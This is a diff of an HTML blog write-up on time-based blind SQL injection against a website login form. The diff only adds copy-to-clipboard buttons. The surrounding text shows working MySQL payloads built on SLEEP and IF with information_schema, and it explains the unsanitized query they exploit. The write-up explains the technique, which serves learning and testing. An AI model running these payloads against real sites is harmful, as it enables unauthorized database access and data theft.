@@ -451,6 +451,12 @@
 
 <p>After a long time of testing MySQL payloads for different purposes such as login bypass, RCE… Finally the only one that worked was</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user'+OR+(SELECT+SLEEP(0.02))=1#</span><span class="w">
 </span></code></pre></div></div>
 
@@ -480,6 +486,12 @@
 
 <p>I don’t have the source code of the website but, I think that in the backend there was a MySQL query similar to this</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="nv">"nombre_usuario"</span><span class="p">]</span>
 </code></pre></div></div>
 
@@ -487,20 +499,44 @@
 
 <p>If we enter a “non-malicious” user, such as</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">HackCommander
 </span></code></pre></div></div>
 
 <p>the query that will be executed is</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'HackCommander'</span>
 </code></pre></div></div>
 
 <p>but if we enter a “malicious” user such as</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">HackCommander' OR (SELECT SLEEP(0.02))=1#</span><span class="w">
 </span></code></pre></div></div>
 
 <p>and <strong>the backend no sanitization is being applied in the input</strong>, the query that will be executed is</p>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">id</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">username</span> <span class="o">=</span> <span class="s1">'HackCommander'</span> <span class="k">OR</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">SLEEP</span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">02</span><span class="p">))</span><span class="o">=</span><span class="mi">1</span><span class="o">#</span><span class="n">Here</span> <span class="n">would</span> <span class="n">be</span> <span class="n">the</span> <span class="n">remaining</span> <span class="n">code</span>
 </code></pre></div></div>
@@ -523,6 +559,12 @@
 
 <p>using the following payload</p>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">USER'+OR+(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),"NO"))=1#</span><span class="w">
 </span></code></pre></div></div>
 
@@ -541,6 +583,12 @@
   <li>The <a href="https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/">information_schema.tables</a> is a view that allows to obtain information about all the views and tables of the database. Therefore, the following SQL code</li>
 </ul>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">select+count(*)+from+information_schema.tables
 </span></code></pre></div></div>
 
@@ -549,6 +597,12 @@
 <ul>
   <li>The following SQL code</li>
 </ul>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">(select+count(*)+from+information_schema.tables)=341
 </span></code></pre></div></div>
@@ -559,6 +613,12 @@
   <li>The following SQL code</li>
 </ul>
 
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
+
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),"NO"))
 </span></code></pre></div></div>
 
@@ -567,6 +627,12 @@
 <ul>
   <li>The above payload needs to be embedded into a SQL query so the following SQL code</li>
 </ul>
+
+<div class="code-header">
+  <button class="copy-code-button">
+    Copy code to clipboard
+  </button>
+</div>
 
 <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),"NO"))=1
 </span></code></pre></div></div>
